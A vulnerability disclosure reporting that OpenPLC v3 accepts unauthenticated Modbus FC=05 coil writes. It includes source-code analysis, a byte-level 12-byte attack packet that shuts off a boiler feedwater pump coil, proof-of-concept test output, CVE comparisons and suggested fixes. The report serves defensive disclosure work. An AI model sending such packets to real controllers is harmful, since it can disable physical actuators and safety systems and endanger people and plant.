# Vulnerability Report: OpenPLC v3 ModbusTCP Unrestricted Coil Write via FC=05

## Metadata

| Field | Value |
|-------|-------|
| **Vendor** | OpenPLC Project (Thiago Alves) |
| **Product** | OpenPLC Runtime v3 |
| **Product URL** | https://github.com/thiagoralves/OpenPLC_v3 |
| **Affected Version** | OpenPLC_v3 master branch (all versions using `webserver/core/modbus.cpp`) |
| **Tested Version** | OpenPLC_v3 (downloaded 2026-01, Docker build on debian:trixie) |
| **CWE** | CWE-306: Missing Authentication for Critical Function |

---

## 1. Summary

An unrestricted write vulnerability exists in the Modbus TCP server functionality of OpenPLC_v3. The `WriteCoil()` function in `webserver/core/modbus.cpp` accepts FC=05 (Write Single Coil) requests from any unauthenticated network client without performing any access control check on the target Output Address. An attacker who can reach TCP port 502 on the OpenPLC host can set or clear **any** coil (addresses 0–8191) in a single 12-byte Modbus request, including coils that map directly to PLC digital output variables (`%QX`) controlling physical actuators such as pumps, valves, relays, and emergency shutoff switches.

This is an implementation-level deficiency:

1. **No configurable write protection**: OpenPLC provides no mechanism (configuration file, web UI, API) to mark any coil as read-only or protected. In contrast, Advantech WISE devices (post CVE-2025-48466 patch) allow disabling Modbus TCP write access entirely, and Schneider Modicon controllers support application-level memory protection.

2. **Direct physical output mapping**: The `bool_output[][]` array targeted by `WriteCoil()` corresponds to IEC 61131-3 digital output variables (`%QX0.0` through `%QX1023.7`). Overwriting these coils **immediately changes the physical output state** of the PLC on the next scan cycle (~100ms).

3. **Surgical precision**: The attack modifies exactly one coil per request. Adjacent coils remain unchanged, making the attack difficult to detect through simple "mass-change" anomaly detection.

---

## 2. Confirmed Vulnerable Version

OpenPLC Runtime v3, downloaded from `https://github.com/thiagoralves/OpenPLC_v3` (master branch).

The vulnerable code in `WriteCoil()` (line 516 of `modbus.cpp`) has remained structurally unchanged across all known versions of OpenPLC v3.

---

## 3. Technical Details

OpenPLC is an open-source programmable logic controller designed for automation and ICS security research. It supports Modbus TCP on TCP/502 and EtherNet/IP. The runtime can be deployed on Linux, Windows, and embedded platforms. OpenPLC is widely cited in academic ICS security research and is used in educational and small-scale industrial deployments.

### 3.1 Vulnerability Root Cause

The vulnerability exists in the processing path for Modbus Function Code 05 (Write Single Coil). The code performs no authentication, authorization, or access control at any point in the request processing chain. The complete call path is:

**`server.cpp:startServer()` → `server.cpp:handleConnections()` → `server.cpp:processMessage()` → `modbus.cpp:processModbusMessage()` → `modbus.cpp:WriteCoil()`**

### 3.2 Code Flow Analysis

When a Modbus TCP client connects to port 502, `startServer()` in `server.cpp` accepts the connection and spawns a handler thread. The handler calls `processMessage()` ([1]), which dispatches to `processModbusMessage()` ([2]):

```c
// server.cpp — processMessage() (line 181)
void processMessage(unsigned char *buffer, int bufferSize, int client_fd, int protocol_type)
{
    int messageSize = 0;
    if (protocol_type == MODBUS_PROTOCOL)
    {
        messageSize = processModbusMessage(buffer, bufferSize);  // [1]
    }
    // response is written back using the SAME buffer
    while (messageSize > 0)
    {
        ssize_t bytesWritten = write(client_fd, buffer, messageSize);  // [2]
        // ...
    }
}
```

Inside `processModbusMessage()`, the function code at `buffer[7]` is checked. **No authentication or client identity check occurs at any point** — not before, during, or after function code dispatch ([3]):

```c
// modbus.cpp — processModbusMessage() (line 1107)
int processModbusMessage(unsigned char *buffer, int bufferSize)
{
    MessageLength = 0;
    // ...

    // NOTE: No authentication, no client identity check, no IP filtering

    else if(buffer[7] == MB_FC_WRITE_COIL)  // FC=05 (0x05)
    {
        WriteCoil(buffer, bufferSize);  // [3] — no auth check before dispatch
    }
    // ...
}
```

The `WriteCoil()` function (line 516) extracts the Output Address from `buffer[8..9]` ([4]), determines the coil value from `buffer[10..11]` ([5]), and writes directly to the `bool_output[][]` array ([6]):

```c
// modbus.cpp — WriteCoil() (line 516)
void WriteCoil(unsigned char *buffer, int bufferSize)
{
    int Start;
    int mb_error = ERR_NONE;

    if (bufferSize < 12)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_VALUE);
        return;
    }

    Start = word(buffer[8], buffer[9]);  // [4] Output Address — attacker-controlled

    if (Start < MAX_COILS)               // MAX_COILS = 8192, only range check
    {
        unsigned char value;
        if (word(buffer[10], buffer[11]) > 0)  // [5] 0xFF00 = ON, 0x0000 = OFF
            value = 1;
        else
            value = 0;

        pthread_mutex_lock(&bufferLock);
        if (bool_output[Start/8][Start%8] != NULL)
        {
            *bool_output[Start/8][Start%8] = value;   // [6] Direct write to physical output
        }
        pthread_mutex_unlock(&bufferLock);
    }
    else
    {
        mb_error = ERR_ILLEGAL_DATA_ADDRESS;
    }

    if (mb_error != ERR_NONE)
    {
        ModbusError(buffer, mb_error);
    }
    else
    {
        buffer[4] = 0;
        buffer[5] = 6;
        MessageLength = 12;  // [7] Normal response — echoes request, confirming write
    }
}
```

### 3.3 Coil-to-Physical-Output Memory Mapping

The `bool_output[][]` array is declared in `ladder.h` (line 62) and initialized in `modbus.cpp` (line 129):

```c
// ladder.h (line 62)
extern IEC_BOOL *bool_output[BUFFER_SIZE][8];  // 2D array: [byte_index][bit_index]

// modbus.cpp (line 129) — initialization
for(int i = 0; i < MAX_COILS; i++)
{
    if (bool_output[i/8][i%8] == NULL)
        bool_output[i/8][i%8] = &mb_coils[i];  // maps to IEC 61131-3 %QX variables
}
```

The mapping works as follows:

| Coil Address | `bool_output` Index | IEC 61131-3 Variable | Physical Meaning |
|-------------|-------------------|---------------------|------------------|
| 0 | `[0][0]` | `%QX0.0` | Digital Output 0, Bit 0 |
| 1 | `[0][1]` | `%QX0.1` | Digital Output 0, Bit 1 |
| 7 | `[0][7]` | `%QX0.7` | Digital Output 0, Bit 7 |
| 8 | `[1][0]` | `%QX1.0` | Digital Output 1, Bit 0 |
| 100 | `[12][4]` | `%QX12.4` | Digital Output 12, Bit 4 |
| 8191 | `[1023][7]` | `%QX1023.7` | Digital Output 1023, Bit 7 |

**Key observation**: Coils 0–8191 map to `%QX` (digital outputs) in IEC 61131-3. These variables directly control physical ON/OFF actuators: relays, solenoid valves, motor contactors, emergency stop circuits, and safety interlocks. Setting a coil to OFF via an unauthenticated Modbus request **immediately de-energizes the corresponding physical output** on the next PLC scan cycle.

---

## 4. Attack Scenario

### 4.1 Threat Model

An attacker with network access to an OpenPLC instance on TCP/502 (e.g., via a flat OT network, misconfigured firewall, or compromised engineering workstation) can set or clear any coil in a single Modbus TCP request.

**Scenario**: Boiler feedwater system. Coil `%QX12.4` (address 0x0064, decimal 100) controls the feedwater pump RUN command. Normal state: ON (pump running, supplying water to the boiler).

### 4.2 Attack Message

The following 12-byte Modbus TCP request sets coil `0x0064` to OFF (de-energizes the feedwater pump):

```
00 01 00 00 00 06 01 05 00 64 00 00
|___| |___| |___| |  |  |___| |___|
  |     |     |   |  FC  Addr  Value = OFF
  |     |     |   Unit ID
  |     |     Length (6 bytes follow)
  |     Protocol ID (Modbus)
  Transaction ID
```

| Byte(s) | Field | Value | Meaning |
|---------|-------|-------|---------|
| 0–1 | Transaction ID | `0x0001` | Arbitrary |
| 2–3 | Protocol ID | `0x0000` | Modbus |
| 4–5 | Length | `0x0006` | 6 bytes follow |
| 6 | Unit Identifier | `0x01` | Slave 1 |
| 7 | Function Code | `0x05` | Write Single Coil |
| 8–9 | Output Address | `0x0064` | Target coil (attacker-chosen) |
| 10–11 | Output Value | `0x0000` | OFF (de-energize) |

**Server Response** — OpenPLC echoes the request, confirming the write:

```
00 01 00 00 00 06 01 05 00 64 00 00
```

The response is byte-for-byte identical to the request, confirming: (a) the coil was written, (b) no authentication was performed, (c) no error was returned.

### 4.3 Physical Impact Chain

```
[Attacker]                    [OpenPLC]                  [Physical Process]
    |                             |                             |
    |-- FC=05, addr=0x0064, OFF ->|                             |
    |                             |-- *bool_output[12][4] = 0 ->|
    |                             |                             |-- Pump relay de-energized
    |<-- echo (write confirmed) --|                             |-- Feedwater flow stops
    |                             |                             |-- Boiler water level drops
    |                             |                             |-- Overheating / dry-fire risk
```

1. The attacker sends a single 12-byte packet.
2. `WriteCoil()` writes `0` to `bool_output[12][4]` (mapped to `%QX12.4`).
3. On the next PLC scan cycle (~100ms), the digital output is de-energized.
4. The feedwater pump relay opens → pump stops → water level drops.
5. Without independent safety instrumented systems (SIS), this leads to overheating, dry-fire, and potential boiler failure.
6. A second 12-byte packet can turn the pump back ON, creating intermittent cycling that may be harder to diagnose than a permanent shutdown.

---

## 5. Proof of Concept

### 5.1 Test Environment

| Component | Configuration |
|-----------|---------------|
| **Target** | OpenPLC v3, Docker container (debian:trixie), `openplc_modbus` |
| **Modbus Port** | TCP/502 (default) |
| **PLC Program** | IEC 61131-3 ST with coils at `%QX0.0`–`%QX0.7` and registers at `%QW0`–`%QW3` |
| **Attacker** | Python 3.11 with raw TCP sockets, container `modbus_client` |
| **Network** | Docker bridge 172.20.0.0/24 |

### 5.2 Reproduction Steps

1. Deploy OpenPLC v3 via Docker with a Modbus-enabled ST program
2. Start the PLC runtime via the web interface (port 8080)
3. From any host with TCP access to port 502:
   a. Read coil 0x0064 via FC=01 → confirm initial state (ON)
   b. Send FC=05 with Output Address `0x0064` and Output Value `0x0000` (OFF)
   c. Read coil 0x0064 via FC=01 → confirm state changed to OFF
   d. Read adjacent coils 0x0063 and 0x0065 → confirm they are unchanged (surgical precision)
4. Repeat with multiple addresses to verify full address space is writable

### 5.3 POC Script

Full POC code: `poc_write_single_coil_output_addr.py` (same directory).

### 5.4 Test Results

**Phase 1 — Precision Attack** (set coil 0x0064 to OFF):

```
Pre-attack state:
  coil[99]  (0x0063) = ON   ← sentinel
  coil[100] (0x0064) = ON   ← target (feedwater pump RUN)
  coil[101] (0x0065) = ON   ← sentinel

TX: 00 04 00 00 00 06 01 05 00 64 00 00   ← FC=05, addr=0x0064, value=OFF
RX: 00 04 00 00 00 06 01 05 00 64 00 00   ← echo (write confirmed)

Post-attack state:
  coil[99]  (0x0063) = ON   ← UNCHANGED (precision verified)
  coil[100] (0x0064) = OFF  ← OVERWRITTEN (ON → OFF, pump stopped)
  coil[101] (0x0065) = ON   ← UNCHANGED (precision verified)
```

**Phase 2 — Address Space Sweep** (5 addresses tested):

| Address | Decimal | Write Value | Read-back | Result |
|---------|---------|-------------|-----------|--------|
| `0x0000` | 0 | ON (0xFF00) | ON | ✓ Write confirmed |
| `0x0032` | 50 | ON (0xFF00) | ON | ✓ Write confirmed |
| `0x0064` | 100 | ON (0xFF00) | ON | ✓ Write confirmed |
| `0x00C8` | 200 | ON (0xFF00) | ON | ✓ Write confirmed |
| `0x01F4` | 500 | ON (0xFF00) | ON | ✓ Write confirmed |

**Result: 5/5 addresses across the coil address space are writable without authentication.**

---

## 6. Impact

The vulnerability allows an unauthenticated remote attacker to set or clear any coil (0–8191) via a single 12-byte network request to TCP/502. No privileges, user interaction, or race conditions are required. Coils in the `%QX` (digital output) range directly control physical ON/OFF actuators — the state change takes effect on the next PLC scan cycle (~100ms), crossing the software boundary into the physical process.

### ICS-Specific Safety Impact

In ICS/SCADA deployments, coils that map to `%QX` (digital outputs) directly drive physical ON/OFF actuators. Overwriting these coils can:

- **De-energize safety-critical pumps** → loss of coolant/feedwater → overheating, dry-fire
- **Open/close solenoid valves** → uncontrolled material flow, overpressure, chemical release
- **Disengage motor contactors** → unplanned process shutdown, mechanical damage from sudden stop
- **Override emergency stop (E-Stop) circuits** → disable safety mechanisms during hazardous conditions
- **Toggle safety interlock flags** → allow dangerous states that would normally be prevented

The attack requires only **12 bytes** per coil manipulation and can be repeated at line rate to create oscillating output states that stress mechanical equipment and are difficult to diagnose.

---

## 7. CWE Classification

| CWE | Name | Application |
|-----|------|-------------|
| **CWE-306** | Missing Authentication for Critical Function | The Modbus TCP coil write path performs no authentication. This is the primary CWE. |
| CWE-862 | Missing Authorization | Even if authentication were added, there is no coil-level permission model to distinguish protected vs. writable coils. |

**Primary CWE: CWE-306** — consistent with:
- CVE-2025-48466 (Advantech WISE, CWE-863 — same vulnerability class on FC=05, different product)
- CVE-2019-6533 (Kunbus PR100088, CWE-306 — missing authentication for Modbus register access, CVSS 10.0)
- CVE-2025-54848 (Socomec DIRIS, CWE-306 — unauthenticated Modbus register write)

---

## 8. MITRE ATT&CK for ICS Mapping

| Technique ID | Name | Relevance |
|-------------|------|-----------|
| **T0855** | Unauthorized Command Message | Sending FC=05 to set/clear coils without authorization |
| **T0831** | Manipulation of Control | Directly altering PLC digital output states to affect physical process |
| **T0836** | Modify Parameter | Changing ON/OFF state of actuator control coils |
| **T0856** | Spoof Reporting Message | Potential follow-up: use FC=15 to mask the attack by restoring read-back values |
| **T0816** | Device Restart/Shutdown | Turning off critical equipment coils effectively shuts down subsystems |

---

## 9. Comparison with Accepted CVEs

The following CVEs have been assigned for the **same class of vulnerability** (unauthenticated Modbus coil/register write) on other products:

| CVE ID | Product | Year | CVSS | FC | CWE | Status |
|--------|---------|------|------|----|-----|--------|
| **CVE-2025-48466** | **Advantech WISE-4060LAN** | **2025** | **8.1** | **FC=05** | **CWE-863** | **Assigned — closest precedent** |
| CVE-2019-6533 | Kunbus PR100088 | 2019 | 10.0 | N/A | CWE-306 | Assigned (CISA ICSA-19-036-05) |
| CVE-2025-54848 | Socomec DIRIS M-70 | 2025 | 7.5 | FC=06 | CWE-306 | Assigned |
| CVE-2024-11737 | Schneider Modicon | 2024 | 9.8 | Multiple | CWE-20 | Assigned (CISA ICSA-24-352-04) |
| CVE-2025-53476 | **OpenPLC v3** | 2025 | 5.3 | N/A | CWE-775 | Assigned (Talos TALOS-2025-2223) |
| CVE-2025-54811 | **OpenPLC v3** | 2025 | 7.1 | N/A | CWE-758 | Assigned (CISA ICSA-25-273-05) |

### 9.1 Detailed Comparison with CVE-2025-48466 (Advantech)

| Aspect | CVE-2025-48466 (Advantech) | This Finding (OpenPLC) |
|--------|---------------------------|------------------------|
| **Product** | Advantech WISE-4060LAN | OpenPLC Runtime v3 |
| **Function Code** | FC=05 Write Single Coil | FC=05 Write Single Coil |
| **Root Cause** | Unauthenticated Modbus TCP coil write | Unauthenticated Modbus TCP coil write |
| **Physical Impact** | Remote control of relay channels | Remote control of digital outputs |
| **CWE** | CWE-863 (Incorrect Authorization) | CWE-306 (Missing Authentication) |
| **CVSSv3.1** | 8.1 (AV:**A**/AC:L/PR:N) | 8.6 (AV:**N**/AC:L/PR:N) |
| **Attack Vector** | Adjacent network (AV:A) | **Network (AV:N)** — broader attack surface |
| **Fix Available** | Firmware A2.02 B00 + Modbus TCP disable | **None — no official fix** |
| **Vendor Response** | Advantech released firmware update | OpenPLC has no coil protection mechanism |

**Key differences from CVE-2025-48466**:
1. Different product and vendor
2. Broader attack vector — OpenPLC is AV:N (network) vs. Advantech's AV:A (adjacent)
3. No available mitigation — Advantech provided a firmware fix; OpenPLC has no coil protection at all
4. Open-source with ICS deployment — OpenPLC is used in educational and small-scale industrial settings

### 9.2 OpenPLC CNA Relationship

OpenPLC v3 has an established CNA relationship with **Cisco Talos**:
- CVE-2024-34026 — EtherNet/IP stack buffer overflow (RCE)
- CVE-2024-39590 — EtherNet/IP resource exhaustion
- CVE-2025-53476 — Modbus TCP connection exhaustion DoS (TALOS-2025-2223)
- CVE-2025-54811 — enipThread undefined behavior crash (CISA ICSA-25-273-05)

This vulnerability affects a **different component** (Modbus FC=05 coil write path) and **different CWE** (CWE-306 vs CWE-775/CWE-758) than all existing OpenPLC CVEs.

---

## 10. Suggested Remediation

### 10.1 Short-term: Coil Write Protection

Add a per-coil access control check in `WriteCoil()` before writing:

```c
// Proposed fix in modbus.cpp
typedef enum { COIL_READWRITE, COIL_READONLY, COIL_PROTECTED } coil_access_t;
extern coil_access_t coil_acl[MAX_COILS];  // configurable via web UI

void WriteCoil(unsigned char *buffer, int bufferSize)
{
    // ... existing size validation ...
    Start = word(buffer[8], buffer[9]);

    if (Start >= MAX_COILS)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_ADDRESS);
        return;
    }

    // NEW: Check write permission
    if (coil_acl[Start] != COIL_READWRITE)
    {
        ModbusError(buffer, ERR_ILLEGAL_DATA_ADDRESS);
        return;
    }

    // ... existing write logic ...
}
```

The same check should be applied to `WriteMultipleCoils()` (line 668) which shares the identical flaw.

### 10.2 Medium-term: IP-based Access Control

Add configurable IP whitelisting for Modbus TCP clients in `server.cpp`, following the approach adopted by Advantech in their CVE-2025-48466 fix:

```c
// Check client IP against whitelist before accepting connection
if (!is_modbus_client_allowed(client_addr.sin_addr)) {
    close(client_fd);
    continue;
}
```

### 10.3 Long-term: Modbus/TCP Security

Implement the Modbus/TCP Security specification (Modbus.org, V2.1 2018) to provide TLS-based mutual authentication and role-based access control, following the same path recommended by CISA in advisory ICSA-25-273-05 for OpenPLC.

---

## 11. References

1. OpenPLC v3 source code: `webserver/core/modbus.cpp`, line 516 (`WriteCoil()`)
2. OpenPLC v3 source code: `webserver/core/modbus.cpp`, line 668 (`WriteMultipleCoils()` — same flaw)
3. OpenPLC v3 source code: `webserver/core/modbus.cpp`, line 1107 (`processModbusMessage()`)
4. OpenPLC v3 source code: `webserver/core/ladder.h`, line 62 (`bool_output[][]` declaration)
5. OpenPLC v3 source code: `webserver/core/server.cpp`, line 181 (`processMessage()`)
6. Modbus Application Protocol Specification V1.1b3, Section 6.5 "Write Single Coil"
7. Modbus/TCP Security Protocol Specification, V2.1 (2018), Modbus.org
8. CVE-2025-48466 — Advantech WISE-4060LAN unauthenticated Modbus coil write (same FC, same vulnerability class)
9. Advantech Security Advisory: WISE-4060LAN firmware A2.02 B00 (mitigation for CVE-2025-48466)
10. CVE-2019-6533 / CISA ICSA-19-036-05 — Kunbus PR100088 missing authentication for Modbus registers (CWE-306, CVSS 10.0)
11. TALOS-2025-2223 / CVE-2025-53476 — OpenPLC ModbusTCP DoS (prior OpenPLC CVE by Cisco Talos)
12. CISA ICS Advisory ICSA-25-273-05 — OpenPLC_V3 (CVE-2025-54811)
13. Al-Sabbagh et al., "Investigating the Security of OpenPLC: Vulnerabilities, Attacks, and Mitigation Solutions," IEEE Access, 2024
14. NIST SP 800-82 Rev. 3, "Guide to Operational Technology (OT) Security"
